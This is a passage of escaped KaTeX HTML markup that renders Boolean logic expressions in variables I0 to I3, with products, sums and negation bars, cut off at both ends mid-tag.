style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">1&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">⋅&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">0&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">+&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">3&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">⋅&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">2&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">⋅&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord overline">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.8833em;">&lt;span style="top:-3em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">1&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span style="top:-3.8033em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="overline-line" style="border-bottom-width:0.04em;">&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">⋅&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">0&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span style="top:-3.1383em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord">&lt;/span>&lt;span class="mspace" style="margin-right:0.2778em;">&lt;/span>&lt;span class="mrel">=&lt;/span>&lt;span class="mspace" style="margin-right:0.2778em;">&lt;/span>&lt;span class="mord overline">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.8833em;">&lt;span style="top:-3em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">3&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span style="top:-3.8033em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="overline-line" style="border-bottom-width:0.04em;">&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">⋅&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">2&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">⋅&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord overline">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.8833em;">&lt;span style="top:-3em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">1&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span style="top:-3.8033em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="overline-line" style="border-bottom-width:0.04em;">&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">⋅&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">0&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">+&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">2&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">⋅&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">1&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">⋅&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord overline">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.8833em;">&lt;span style="top:-3em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">0&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span style="top:-3.8033em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="overline-line" style="border-bottom-width:0.04em;">&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">+&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">3&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">⋅&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">1&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">⋅&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">0&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">+&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">3&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">⋅&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">2&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">⋅&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord overline">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.8833em;">&lt;span style="top:-3em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">0&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span style="top:-3.8033em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="overline-line" style="border-bottom-width:0.04em;">&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span style="top:-1.595em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord">&lt;/span>&lt;span class="mspace" style="margin-right:0.2778em;">&lt;/span>&lt;span class="mrel">=&lt;/span>&lt;span class="mspace" style="margin-right:0.2778em;">&lt;/span>&lt;span class="mord overline">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.8833em;">&lt;span style="top:-3em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">3&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span style="top:-3.8033em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="overline-line" style="border-bottom-width:0.04em;">&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">⋅&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">0&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">+&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord overline">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.8833em;">&lt;span style="top:-3em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">3&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span style="top:-3.8033em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="overline-line" style="border-bottom-width:0.04em;">&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">⋅&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">2&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">⋅&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord overline">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.8833em;">&lt;span style="top:-3em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">1&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span style="top:-3.8033em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="overline-line" style="border-bottom-width:0.04em;">&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">+&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord overline">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.8833em;">&lt;span style="top:-3em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">2&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span style="top:-3.8033em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="overline-line" style="border-bottom-width:0.04em;">&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">⋅&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord overline">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.8833em;">&lt;span style="top:-3em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">1&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" 